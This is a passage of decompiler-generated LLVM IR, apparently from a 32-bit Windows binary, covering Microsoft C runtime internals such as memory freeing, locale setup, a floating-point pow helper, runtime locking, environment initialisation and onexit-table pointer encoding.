dec_label_pc_100193d6:                            ; preds = %dec_label_pc_100193ca
  %47 = load i8, i8* @global_var_1003d3e4, align 1, !insn.addr !9076
  %48 = and i8 %47, 1, !insn.addr !9076
  %49 = icmp eq i8 %48, 0, !insn.addr !9076
  %50 = icmp eq i1 %49, false, !insn.addr !9077
  br i1 %50, label %dec_label_pc_1001940f, label %dec_label_pc_100193df, !insn.addr !9077

dec_label_pc_100193df:                            ; preds = %dec_label_pc_100193d6
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %51 = mul i32 %ecx.0.reload, 16, !insn.addr !9078
  %52 = add i32 %51, %26, !insn.addr !9078
  %53 = inttoptr i32 %52 to i32*, !insn.addr !9078
  %54 = load i32, i32* %53, align 4, !insn.addr !9078
  %55 = icmp eq i32 %54, 0, !insn.addr !9079
  br i1 %55, label %dec_label_pc_1001940f, label %dec_label_pc_100193ed, !insn.addr !9080

dec_label_pc_100193ed:                            ; preds = %dec_label_pc_100193df
  %56 = inttoptr i32 %54 to i32*, !insn.addr !9081
  %57 = load i32, i32* %56, align 4, !insn.addr !9081
  %58 = add i32 %57, %ecx.0.reload, !insn.addr !9081
  store i32 %58, i32* %56, align 4, !insn.addr !9081
  %59 = add i32 %57, -1, !insn.addr !9082
  %60 = icmp eq i32 %59, 0, !insn.addr !9082
  %61 = icmp eq i1 %60, false, !insn.addr !9083
  br i1 %61, label %dec_label_pc_1001940f, label %dec_label_pc_100193f4, !insn.addr !9083

dec_label_pc_100193f4:                            ; preds = %dec_label_pc_100193ed
  %62 = mul i32 %59, 16, !insn.addr !9084
  %63 = add i32 %62, %26, !insn.addr !9084
  %64 = inttoptr i32 %63 to i32*, !insn.addr !9084
  %65 = load i32, i32* %64, align 4, !insn.addr !9084
  %66 = call i32 @__free_base(i32 %65), !insn.addr !9085
  %67 = mul i32 %65, 16, !insn.addr !9086
  %68 = add i32 %67, %26, !insn.addr !9086
  %69 = inttoptr i32 %68 to i32*, !insn.addr !9086
  store i32 0, i32* %69, align 4, !insn.addr !9086
  br label %dec_label_pc_1001940f, !insn.addr !9086

dec_label_pc_1001940f:                            ; preds = %dec_label_pc_100193f4, %dec_label_pc_100193ed, %dec_label_pc_100193df, %dec_label_pc_100193d6, %dec_label_pc_100193ca
  %70 = add i32 %24, 12, !insn.addr !9087
  %71 = inttoptr i32 %70 to i32*, !insn.addr !9087
  %72 = load i32, i32* %71, align 4, !insn.addr !9087
  %73 = inttoptr i32 %17 to i32*, !insn.addr !9088
  store i32 %72, i32* %73, align 4, !insn.addr !9088
  %74 = mul i32 %72, 16, !insn.addr !9089
  %75 = add i32 %74, %26, !insn.addr !9089
  %76 = inttoptr i32 %75 to i32*, !insn.addr !9089
  store i32 %17, i32* %76, align 4, !insn.addr !9089
  %77 = mul i32 %72, 32, !insn.addr !9090
  %78 = add i32 %24, 28, !insn.addr !9090
  %79 = add i32 %78, %77, !insn.addr !9090
  %80 = inttoptr i32 %79 to i32*, !insn.addr !9090
  store i32 %20, i32* %80, align 4, !insn.addr !9090
  store i32 %20, i32* %eax.1.reg2mem, !insn.addr !9090
  br label %dec_label_pc_1001942c, !insn.addr !9090

dec_label_pc_1001942c:                            ; preds = %dec_label_pc_1001940f, %dec_label_pc_10019378, %dec_label_pc_1001933e, %dec_label_pc_10019334, %dec_label_pc_100192d3
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !9091

dec_label_pc_10019437:                            ; preds = %dec_label_pc_10019351, %dec_label_pc_10019351, %dec_label_pc_10019334, %dec_label_pc_100192f9
  %81 = call i32 @__invoke_watson(i32 0, i32 0, i32 0, i32 0, i32 0), !insn.addr !9092
  %82 = call i32 @__asm_int3(), !insn.addr !9093
  ret i32 %82, !insn.addr !9093
}

declare i32 @_call_wsetlocale(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__calloc_base() local_unnamed_addr

declare void @_abort() local_unnamed_addr

declare i32 @__malloc_base() local_unnamed_addr

declare i32 @_memcpy_s.14(i32, i32, i32, i32) local_unnamed_addr

define i32 @function_1001a344(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001a344:
  %eax.1.reg2mem = alloca i32, !insn.addr !9094
  %eax.0.reg2mem = alloca i32, !insn.addr !9094
  %0 = call x86_fp80 @__decompiler_undefined_function_19()
  %stack_var_-120 = alloca i32, align 4
  %1 = call i32 @__fload_withFB(), !insn.addr !9095
  %2 = trunc i32 %1 to i16, !insn.addr !9096
  %3 = call i32 @__asm_wait(), !insn.addr !9097
  %4 = icmp eq i16 %2, 639, !insn.addr !9098
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !9099
  br i1 %4, label %dec_label_pc_1001a361, label %dec_label_pc_1001a35c, !insn.addr !9099

dec_label_pc_1001a35c:                            ; preds = %dec_label_pc_1001a344
  %5 = call i32 @__load_CW(), !insn.addr !9100
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !9100
  br label %dec_label_pc_1001a361, !insn.addr !9100

dec_label_pc_1001a361:                            ; preds = %dec_label_pc_1001a35c, %dec_label_pc_1001a344
  %6 = and i32 %1, 2146435072, !insn.addr !9101
  %7 = icmp eq i32 %6, 2146435072, !insn.addr !9102
  br i1 %7, label %dec_label_pc_1001a413, label %dec_label_pc_1001a377, !insn.addr !9103

dec_label_pc_1001a377:                            ; preds = %dec_label_pc_1001a361
  %8 = call i32 @__fload_withFB(), !insn.addr !9104
  %9 = and i32 %8, 2146435072, !insn.addr !9105
  %10 = icmp eq i32 %9, 0, !insn.addr !9105
  br i1 %10, label %dec_label_pc_1001a482, label %dec_label_pc_1001a38d, !insn.addr !9106

dec_label_pc_1001a38d:                            ; preds = %dec_label_pc_1001a482, %dec_label_pc_1001a377
  %11 = icmp sgt i8 %arg3, -1, !insn.addr !9107
  %12 = icmp eq i1 %11, false, !insn.addr !9108
  br i1 %12, label %dec_label_pc_1001a4ec, label %dec_label_pc_1001a39a, !insn.addr !9108

dec_label_pc_1001a39a:                            ; preds = %dec_label_pc_1001a4ec, %dec_label_pc_1001a38d
  %13 = call i32 @__twoToTOS(), !insn.addr !9109
  %14 = load i32, i32* @global_var_1003ebf4, align 4, !insn.addr !9110
  %15 = icmp eq i32 %14, 0, !insn.addr !9110
  %16 = icmp eq i1 %15, false, !insn.addr !9111
  br i1 %16, label %17, label %dec_label_pc_1001a3b5, !insn.addr !9111

; <label>:17:                                     ; preds = %dec_label_pc_1001a39a
  %18 = call i32 @__fast_exit(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9111
  br label %dec_label_pc_1001a3b5, !insn.addr !9111

dec_label_pc_1001a3b5:                            ; preds = %17, %dec_label_pc_1001a39a
  %19 = call i32 @__check_range_exit(), !insn.addr !9112
  ret i32 %19, !insn.addr !9112

dec_label_pc_1001a3c5:                            ; preds = %dec_label_pc_1001a4a6, %dec_label_pc_1001a44b, %50
  %20 = load i32, i32* @global_var_1003ebf4, align 4, !insn.addr !9113
  %21 = icmp eq i32 %20, 0, !insn.addr !9113
  %22 = icmp eq i1 %21, false, !insn.addr !9114
  br i1 %22, label %23, label %dec_label_pc_1001a3d2, !insn.addr !9114

; <label>:23:                                     ; preds = %dec_label_pc_1001a3c5
  %24 = call i32 @__fast_exit(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9114
  br label %dec_label_pc_1001a3d2, !insn.addr !9114

dec_label_pc_1001a3d2:                            ; preds = %23, %dec_label_pc_1001a3c5
  %25 = call i32 @__startTwoArgErrorHandling(), !insn.addr !9115
  ret i32 %25, !insn.addr !9116

dec_label_pc_1001a3f8:                            ; preds = %dec_label_pc_1001a441
  %26 = call i32 @__asm_fxam(x86_fp80 %0), !insn.addr !9117
  %27 = call i32 @__asm_wait(), !insn.addr !9118
  %28 = call i32 @__asm_wait(), !insn.addr !9119
  store i32 %28, i32* %eax.1.reg2mem
  br label %dec_label_pc_1001a403

dec_label_pc_1001a403:                            ; preds = %dec_label_pc_1001a3f8, %dec_label_pc_1001a413
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !9120

dec_label_pc_1001a413:                            ; preds = %dec_label_pc_1001a361
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %29 = and i32 %eax.0.reload, 1048575, !insn.addr !9121
  %30 = or i32 %29, %arg4, !insn.addr !9122
  %31 = icmp eq i32 %30, 0, !insn.addr !9122
  %32 = icmp eq i1 %31, false, !insn.addr !9123
  %33 = call i32 @__fload_withFB()
  store i32 %33, i32* %eax.1.reg2mem, !insn.addr !9123
  br i1 %32, label %dec_label_pc_1001a403, label %dec_label_pc_1001a429, !insn.addr !9123

dec_label_pc_1001a429:                            ; preds = %dec_label_pc_1001a413
  %34 = and i32 %arg2, 2146435072, !insn.addr !9124
  %35 = icmp eq i32 %34, 2146435072, !insn.addr !9125
  %36 = icmp eq i1 %35, false, !insn.addr !9126
  br i1 %36, label %dec_label_pc_1001a44b, label %dec_label_pc_1001a441, !insn.addr !9126

dec_label_pc_1001a441:                            ; preds = %dec_label_pc_1001a429
  %37 = and i32 %arg2, 1048575, !insn.addr !9127
  %38 = or i32 %37, %arg1, !insn.addr !9128
  %39 = icmp eq i32 %38, 0, !insn.addr !9128
  %40 = icmp eq i1 %39, false, !insn.addr !9129
  br i1 %40, label %dec_label_pc_1001a3f8, label %dec_label_pc_1001a44b, !insn.addr !9129

dec_label_pc_1001a44b:                            ; preds = %dec_label_pc_1001a429, %dec_label_pc_1001a441
  %41 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !9130
  %42 = call i32 @__asm_wait(), !insn.addr !9131
  %43 = call i32 @__asm_fnsave(), !insn.addr !9132
  %44 = sext i32 %43 to i864, !insn.addr !9132
  %45 = call i32 @__powhlp(i864 %44), !insn.addr !9133
  %46 = add i32 %41, 8, !insn.addr !9134
  %47 = inttoptr i32 %46 to i864*, !insn.addr !9134
  %48 = load i864, i864* %47, align 4, !insn.addr !9134
  call void @__asm_frstor(i864 %48), !insn.addr !9134
  %49 = icmp eq i32 %45, 0, !insn.addr !9135
  br i1 %49, label %50, label %dec_label_pc_1001a3c5, !insn.addr !9136

; <label>:50:                                     ; preds = %dec_label_pc_1001a44b
  %51 = call i32 @__fast_exit(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9136
  br label %dec_label_pc_1001a3c5, !insn.addr !9136

dec_label_pc_1001a482:                            ; preds = %dec_label_pc_1001a377
  %52 = and i32 %arg2, 1048575, !insn.addr !9137
  %53 = or i32 %52, %arg1, !insn.addr !9138
  %54 = icmp eq i32 %53, 0, !insn.addr !9138
  %55 = icmp eq i1 %54, false, !insn.addr !9139
  br i1 %55, label %dec_label_pc_1001a38d, label %dec_label_pc_1001a495, !insn.addr !9139

dec_label_pc_1001a495:                            ; preds = %dec_label_pc_1001a482
  %56 = and i32 %arg5, 2147483647, !insn.addr !9140
  %57 = or i32 %56, %arg4, !insn.addr !9141
  %58 = icmp eq i32 %57, 0, !insn.addr !9141
  br i1 %58, label %dec_label_pc_1001a4e3, label %dec_label_pc_1001a4a6, !insn.addr !9142

dec_label_pc_1001a4a6:                            ; preds = %dec_label_pc_1001a495
  %59 = call x86_fp80 @function_1001a511(), !insn.addr !9143
  %60 = trunc i32 %arg6 to i8
  %61 = icmp sgt i8 %60, -1, !insn.addr !9144
  br i1 %61, label %dec_label_pc_1001a4d2, label %dec_label_pc_1001a3c5, !insn.addr !9145

dec_label_pc_1001a4d2:                            ; preds = %dec_label_pc_1001a4a6
  %62 = call i32 @__fast_exit(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9146
  %63 = call i32 @__fast_exit(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9147
  ret i32 %63, !insn.addr !9147

dec_label_pc_1001a4e3:                            ; preds = %dec_label_pc_1001a495
  %64 = call i32 @__fast_exit(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9148
  ret i32 %64, !insn.addr !9148

dec_label_pc_1001a4ec:                            ; preds = %dec_label_pc_1001a38d
  %65 = call x86_fp80 @function_1001a511(), !insn.addr !9149
  br label %dec_label_pc_1001a39a
}

define x86_fp80 @function_1001a511() local_unnamed_addr {
dec_label_pc_1001a511:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call x86_fp80 @__decompiler_undefined_function_19()
  %2 = call x86_fp80 @llvm.round.f80(x86_fp80 %1), !insn.addr !9150
  %3 = call i32 @__asm_wait(), !insn.addr !9151
  %4 = and i32 %0, 16384
  %5 = icmp ne i32 %4, 0, !insn.addr !9152
  %6 = icmp eq i1 %5, false, !insn.addr !9153
  br i1 %6, label %dec_label_pc_1001a536, label %dec_label_pc_1001a51f, !insn.addr !9153

dec_label_pc_1001a51f:                            ; preds = %dec_label_pc_1001a511
  %7 = fmul x86_fp80 %2, 0xK3FFE8000000000000000, !insn.addr !9154
  %8 = call i32 @__asm_wait(), !insn.addr !9155
  ret x86_fp80 %7, !insn.addr !9156

dec_label_pc_1001a536:                            ; preds = %dec_label_pc_1001a511
  ret x86_fp80 %2, !insn.addr !9157
}

declare i32 @__free_base(i32) local_unnamed_addr

define i32 @function_1001ab23() local_unnamed_addr {
dec_label_pc_1001ab23:
  %0 = call i32 @___acrt_unlock(i32 0), !insn.addr !9158
  ret i32 %0, !insn.addr !9159
}

declare i32 @_terminate() local_unnamed_addr

declare i32 @"??$common_configure_argv@D@@YAHW4_crt_argv_mode@@@Z"(i32) local_unnamed_addr

define i32 @function_1001affb(i32 %arg1) local_unnamed_addr {
dec_label_pc_1001affb:
  %0 = call i32 @"??$common_configure_argv@D@@YAHW4_crt_argv_mode@@@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9160
  ret i32 %0, !insn.addr !9160
}

declare i32 @"??$common_get_or_create_environment_nolock@D@@YAPAPADXZ"() local_unnamed_addr

declare i32 @"??$common_initialize_environment_nolock@D@@YAHXZ"() local_unnamed_addr

define i32 @___dcrt_get_or_create_narrow_environment_nolock() local_unnamed_addr {
dec_label_pc_1001b280:
  %0 = call i32 @"??$common_get_or_create_environment_nolock@D@@YAPAPADXZ"(), !insn.addr !9161
  ret i32 %0, !insn.addr !9161
}

declare i32 @___dcrt_uninitialize_environments_nolock() local_unnamed_addr

define i32 @function_1001b2bc() local_unnamed_addr {
dec_label_pc_1001b2bc:
  %0 = call i32 @"??$common_initialize_environment_nolock@D@@YAHXZ"(), !insn.addr !9162
  ret i32 %0, !insn.addr !9162
}

define i32 @function_1001b2c1(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001b2c1:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003ba28, i32 12), !insn.addr !9163
  %2 = add i32 %0, -28, !insn.addr !9164
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9164
  store i32 0, i32* %3, align 4, !insn.addr !9164
  %4 = add i32 %0, 8, !insn.addr !9165
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9165
  %6 = load i32, i32* %5, align 4, !insn.addr !9165
  %7 = inttoptr i32 %6 to i32*, !insn.addr !9166
  %8 = load i32, i32* %7, align 4, !insn.addr !9166
  %9 = call i32 @___acrt_lock(i32 %8), !insn.addr !9167
  %10 = add i32 %0, -4, !insn.addr !9168
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9168
  store i32 0, i32* %11, align 4, !insn.addr !9168
  %12 = call i32 @function_1001b513(), !insn.addr !9169
  store i32 %12, i32* %3, align 4, !insn.addr !9170
  store i32 -2, i32* %11, align 4, !insn.addr !9171
  %13 = call i32 @function_1001b306(), !insn.addr !9172
  %14 = call i32 @__SEH_epilog4(), !insn.addr !9173
  ret i32 %14, !insn.addr !9174
}

define i32 @function_1001b306() local_unnamed_addr {
dec_label_pc_1001b306:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9175
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9175
  %3 = load i32, i32* %2, align 4, !insn.addr !9175
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9176
  %5 = load i32, i32* %4, align 4, !insn.addr !9176
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9177
  ret i32 %6, !insn.addr !9178
}

define i32 @function_1001b312(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001b312:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003ba08, i32 12), !insn.addr !9179
  %2 = add i32 %0, -28, !insn.addr !9180
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9180
  store i32 0, i32* %3, align 4, !insn.addr !9180
  %4 = add i32 %0, 8, !insn.addr !9181
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9181
  %6 = load i32, i32* %5, align 4, !insn.addr !9181
  %7 = inttoptr i32 %6 to i32*, !insn.addr !9182
  %8 = load i32, i32* %7, align 4, !insn.addr !9182
  %9 = call i32 @___acrt_lock(i32 %8), !insn.addr !9183
  %10 = add i32 %0, -4, !insn.addr !9184
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9184
  store i32 0, i32* %11, align 4, !insn.addr !9184
  %12 = call i32 @function_1001b3d2(), !insn.addr !9185
  store i32 %12, i32* %3, align 4, !insn.addr !9186
  store i32 -2, i32* %11, align 4, !insn.addr !9187
  %13 = call i32 @function_1001b357(), !insn.addr !9188
  %14 = call i32 @__SEH_epilog4(), !insn.addr !9189
  ret i32 %14, !insn.addr !9190
}

define i32 @function_1001b357() local_unnamed_addr {
dec_label_pc_1001b357:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9191
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9191
  %3 = load i32, i32* %2, align 4, !insn.addr !9191
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9192
  %5 = load i32, i32* %4, align 4, !insn.addr !9192
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9193
  ret i32 %6, !insn.addr !9194
}

define i32 @"??$__acrt_lock_and_call@V<lambda_22ebabd17bc4fa466a2aca6d8deb888d>@@@@YAHW4__acrt_lock_id@@$$QAV<lambda_22ebabd17bc4fa466a2aca6d8deb888d>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1001b363:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9195
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9196
  %2 = call i32 @function_1001b312(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9197
  ret i32 %2, !insn.addr !9198
}

define i32 @"??$__acrt_lock_and_call@V<lambda_f03950bc5685219e0bcd2087efbe011e>@@@@YAHW4__acrt_lock_id@@$$QAV<lambda_f03950bc5685219e0bcd2087efbe011e>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1001b38b:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9199
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9200
  %2 = call i32 @function_1001b2c1(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9201
  ret i32 %2, !insn.addr !9202
}

declare i32 @"??$__crt_fast_encode_pointer@P6AHI@Z@@YAP6AHI@ZQ6AHI@Z@Z"(i32 (i32)*) local_unnamed_addr

define i32 @function_1001b3d2() local_unnamed_addr {
dec_label_pc_1001b3d2:
  %storemerge5.reg2mem = alloca i32, !insn.addr !9203
  %edi.3.reg2mem = alloca i32, !insn.addr !9203
  %esi.1.reg2mem = alloca i32, !insn.addr !9203
  %ebx.1.reg2mem = alloca i32, !insn.addr !9203
  %ecx.2.reg2mem = alloca i32, !insn.addr !9203
  %ecx.1.reg2mem = alloca i32, !insn.addr !9203
  %eax.1.reg2mem = alloca i32, !insn.addr !9203
  %edi.2.reg2mem = alloca i32, !insn.addr !9203
  %ecx.0.reg2mem = alloca i32, !insn.addr !9203
  %esi.0.reg2mem = alloca i32, !insn.addr !9203
  %edi.06.reg2mem = alloca i32, !insn.addr !9203
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = icmp eq i32 %0, 0, !insn.addr !9204
  %2 = icmp eq i1 %1, false, !insn.addr !9205
  store i32 -1, i32* %storemerge5.reg2mem, !insn.addr !9205
  br i1 %2, label %dec_label_pc_1001b3f0, label %dec_label_pc_1001b50e, !insn.addr !9205

dec_label_pc_1001b3f0:                            ; preds = %dec_label_pc_1001b3d2
  %3 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !9206
  %4 = and i32 %3, 31, !insn.addr !9207
  %5 = add i32 %0, 4, !insn.addr !9208
  %6 = inttoptr i32 %5 to i32*, !insn.addr !9208
  %7 = load i32, i32* %6, align 4, !insn.addr !9208
  %8 = add i32 %0, 8, !insn.addr !9209
  %9 = inttoptr i32 %8 to i32*, !insn.addr !9209
  %10 = load i32, i32* %9, align 4, !insn.addr !9209
  %11 = xor i32 %7, %3, !insn.addr !9210
  %12 = xor i32 %10, %3, !insn.addr !9211
  %13 = icmp eq i32 %4, 0, !insn.addr !9212
  store i32 %11, i32* %edi.06.reg2mem, !insn.addr !9212
  store i32 %12, i32* %esi.0.reg2mem, !insn.addr !9212
  br i1 %13, label %.thread, label %14, !insn.addr !9212

; <label>:14:                                     ; preds = %dec_label_pc_1001b3f0
  %15 = lshr i32 %11, %4, !insn.addr !9212
  %16 = sub nsw i32 32, %4
  %17 = shl i32 %11, %16, !insn.addr !9212
  %18 = or i32 %15, %17, !insn.addr !9212
  %19 = lshr i32 %12, %4, !insn.addr !9213
  %20 = shl i32 %12, %16, !insn.addr !9213
  %21 = or i32 %19, %20, !insn.addr !9213
  store i32 %18, i32* %edi.06.reg2mem, !insn.addr !9213
  store i32 %21, i32* %esi.0.reg2mem, !insn.addr !9213
  br label %.thread, !insn.addr !9213

.thread:                                          ; preds = %dec_label_pc_1001b3f0, %14
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %edi.06.reload = load i32, i32* %edi.06.reg2mem
  %22 = icmp eq i32 %edi.06.reload, %esi.0.reload, !insn.addr !9214
  %23 = icmp eq i1 %22, false, !insn.addr !9215
  store i32 %4, i32* %ecx.2.reg2mem, !insn.addr !9215
  store i32 0, i32* %ebx.1.reg2mem, !insn.addr !9215
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !9215
  store i32 %edi.06.reload, i32* %edi.3.reg2mem, !insn.addr !9215
  br i1 %23, label %dec_label_pc_1001b4cc, label %dec_label_pc_1001b418, !insn.addr !9215

dec_label_pc_1001b418:                            ; preds = %.thread
  %24 = sdiv i32 %esi.0.reload, 4, !insn.addr !9216
  %25 = icmp ult i32 %24, 512
  %spec.select = select i1 %25, i32 %24, i32 512
  %26 = add nsw i32 %spec.select, %24, !insn.addr !9217
  %27 = icmp eq i32 %26, 0, !insn.addr !9218
  %28 = icmp eq i1 %27, false, !insn.addr !9219
  %edi.1 = select i1 %28, i32 %26, i32 32
  %29 = icmp ult i32 %edi.1, %24, !insn.addr !9220
  br i1 %29, label %dec_label_pc_1001b453, label %dec_label_pc_1001b436, !insn.addr !9221

dec_label_pc_1001b436:                            ; preds = %dec_label_pc_1001b418
  %30 = call i32 @__recalloc_base(i32 0, i32 %edi.1, i32 4), !insn.addr !9222
  %31 = call i32 @__free_base(i32 0), !insn.addr !9223
  %32 = icmp eq i32 %30, 0, !insn.addr !9224
  %33 = icmp eq i1 %32, false, !insn.addr !9225
  store i32 %30, i32* %ecx.0.reg2mem, !insn.addr !9225
  store i32 %edi.1, i32* %edi.2.reg2mem, !insn.addr !9225
  br i1 %33, label %dec_label_pc_1001b47b, label %dec_label_pc_1001b453, !insn.addr !9225

dec_label_pc_1001b453:                            ; preds = %dec_label_pc_1001b436, %dec_label_pc_1001b418
  %34 = add nsw i32 %24, 4, !insn.addr !9226
  %35 = call i32 @__recalloc_base(i32 0, i32 %34, i32 4), !insn.addr !9227
  %36 = call i32 @__free_base(i32 0), !insn.addr !9228
  %37 = icmp eq i32 %35, 0, !insn.addr !9229
  %38 = icmp eq i1 %37, false, !insn.addr !9230
  store i32 %35, i32* %ecx.0.reg2mem, !insn.addr !9230
  store i32 %34, i32* %edi.2.reg2mem, !insn.addr !9230
  store i32 -1, i32* %storemerge5.reg2mem, !insn.addr !9230
  br i1 %38, label %dec_label_pc_1001b47b, label %dec_label_pc_1001b50e, !insn.addr !9230

dec_label_pc_1001b47b:                            ; preds = %dec_label_pc_1001b453, %dec_label_pc_1001b436
  %edi.2.reload = load i32, i32* %edi.2.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %39 = and i32 %esi.0.reload, -4, !insn.addr !9231
  %40 = add i32 %ecx.0.reload, %39, !insn.addr !9231
  %41 = mul i32 %edi.2.reload, 4, !insn.addr !9232
  %42 = add i32 %41, %ecx.0.reload, !insn.addr !9232
  %43 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !9233
  %44 = sub i32 3, %40, !insn.addr !9234
  %45 = add i32 %44, %42, !insn.addr !9235
  %46 = udiv i32 %45, 4, !insn.addr !9236
  %47 = icmp ult i32 %42, %40, !insn.addr !9237
  %48 = icmp ult i32 %45, 4
  %49 = or i1 %47, %48, !insn.addr !9238
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !9239
  store i32 %40, i32* %ecx.1.reg2mem, !insn.addr !9239
  store i32 %40, i32* %ecx.2.reg2mem, !insn.addr !9239
  store i32 %ecx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !9239
  store i32 %42, i32* %esi.1.reg2mem, !insn.addr !9239
  store i32 %40, i32* %edi.3.reg2mem, !insn.addr !9239
  br i1 %49, label %dec_label_pc_1001b4cc, label %dec_label_pc_1001b4c1, !insn.addr !9239

dec_label_pc_1001b4c1:                            ; preds = %dec_label_pc_1001b47b, %dec_label_pc_1001b4c1
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %50 = add i32 %eax.1.reload, 1, !insn.addr !9240
  %51 = inttoptr i32 %ecx.1.reload to i32*, !insn.addr !9241
  store i32 %43, i32* %51, align 4, !insn.addr !9241
  %52 = add i32 %ecx.1.reload, 4, !insn.addr !9242
  %53 = icmp eq i32 %50, %46, !insn.addr !9243
  %54 = icmp eq i1 %53, false, !insn.addr !9244
  store i32 %50, i32* %eax.1.reg2mem, !insn.addr !9244
  store i32 %52, i32* %ecx.1.reg2mem, !insn.addr !9244
  store i32 %52, i32* %ecx.2.reg2mem, !insn.addr !9244
  store i32 %ecx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !9244
  store i32 %42, i32* %esi.1.reg2mem, !insn.addr !9244
  store i32 %40, i32* %edi.3.reg2mem, !insn.addr !9244
  br i1 %54, label %dec_label_pc_1001b4c1, label %dec_label_pc_1001b4cc, !insn.addr !9244

dec_label_pc_1001b4cc:                            ; preds = %dec_label_pc_1001b4c1, %dec_label_pc_1001b47b, %.thread
  %edi.3.reload = load i32, i32* %edi.3.reg2mem
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %55 = load i32, i32* %6, align 4, !insn.addr !9245
  %56 = inttoptr i32 %55 to i32*, !insn.addr !9246
  %57 = load i32, i32* %56, align 4, !insn.addr !9246
  %58 = inttoptr i32 %57 to i32 (i32)*, !insn.addr !9246
  %59 = call i32 @"??$__crt_fast_encode_pointer@P6AHI@Z@@YAP6AHI@ZQ6AHI@Z@Z"(i32 (i32)* %58), !insn.addr !9247
  %60 = inttoptr i32 %ebx.1.reload to void ()*, !insn.addr !9248
  %61 = inttoptr i32 %edi.3.reload to i32*, !insn.addr !9249
  store i32 %59, i32* %61, align 4, !insn.addr !9249
  %62 = call i32 @"??$__crt_fast_encode_pointer@P6AXXZ@@YAP6AXXZQ6AXXZ@Z"(void ()* %60), !insn.addr !9250
  %63 = inttoptr i32 %ecx.2.reload to i32*, !insn.addr !9251
  store i32 %62, i32* %63, align 4, !insn.addr !9251
  %64 = add i32 %edi.3.reload, 4, !insn.addr !9252
  %65 = inttoptr i32 %64 to void ()*, !insn.addr !9253
  %66 = call i32 @"??$__crt_fast_encode_pointer@P6AXXZ@@YAP6AXXZQ6AXXZ@Z"(void ()* %65), !insn.addr !9254
  %67 = inttoptr i32 %esi.1.reload to void ()*, !insn.addr !9255
  %68 = add i32 %ecx.2.reload, 4, !insn.addr !9256
  %69 = inttoptr i32 %68 to i32*, !insn.addr !9256
  store i32 %66, i32* %69, align 4, !insn.addr !9256
  %70 = call i32 @"??$__crt_fast_encode_pointer@P6AXXZ@@YAP6AXXZQ6AXXZ@Z"(void ()* %67), !insn.addr !9257
  %71 = add i32 %ecx.2.reload, 8, !insn.addr !9258
  %72 = inttoptr i32 %71 to i32*, !insn.addr !9258
  store i32 %70, i32* %72, align 4, !insn.addr !9258
